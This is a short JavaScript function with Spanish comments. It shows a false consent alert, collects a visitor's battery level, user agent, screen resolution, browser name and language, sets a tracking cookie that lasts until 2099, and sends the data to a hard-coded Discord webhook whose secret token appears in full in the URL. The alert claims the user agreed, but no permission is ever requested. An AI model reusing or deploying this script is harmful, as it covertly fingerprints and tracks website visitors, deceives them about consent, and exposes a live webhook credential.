function obtenerInformacion() {
    // Pide permiso para acceder a la información del dispositivo
    if (window.DeviceOrientationEvent) {
        // Si el dispositivo permite el acceso a la orientación, puede obtenerse información adicional
        alert("Gracias por aceptar. Se enviará información del dispositivo y cookies.");

        // Obtiene información sobre el nivel de batería
        navigator.getBattery().then(function(bateria) {
            var nivelBateria = bateria.level * 100; // Convertir a porcentaje
            var informacion = "Nivel de batería: " + nivelBateria.toFixed(2) + "%\n";

            // Obtiene el agente de usuario (user agent)
            var userAgent = navigator.userAgent;
            informacion += "Agente de usuario: " + userAgent + "\n";

            // Crea una cookie de seguimiento
            document.cookie = "usuario=" + encodeURIComponent(userAgent) + "; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/";

            // Obtiene la resolución de pantalla
            var resolucionPantalla = window.screen.width + "x" + window.screen.height;
            informacion += "Resolución de pantalla: " + resolucionPantalla + "\n";

            // Obtiene el tipo de navegador
            var tipoNavegador = navigator.appName;
            informacion += "Tipo de navegador: " + tipoNavegador + "\n";

            // Obtiene el idioma del navegador
            var idiomaNavegador = navigator.language;
            informacion += "Idioma del navegador: " + idiomaNavegador + "\n";

            // Enviar información al webhook de Discord
            fetch('https://discord.com/api/webhooks/1201960050659434506/rD9wpnNwoVf2e6eSkTsMNsleR7Znw7wwaExUwyi7soqgBdGeGLGjfjKcYoIX0FMZA6dd', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content: informacion })
            }).then(response => {
                if (response.ok) {
                    console.log("Información enviada exitosamente al webhook de Discord.");
                } else {
                    console.error("Error al enviar información al webhook de Discord:", response.statusText);
                }
            }).catch(error => {
                console.error("Error al enviar información al webhook de Discord:", error);
            });
        }).catch(function(error) {
            console.error("Error al obtener información de la batería:", error);
        });
    } else {
        alert("Lo siento, tu dispositivo no permite obtener esta información.");
    }
}
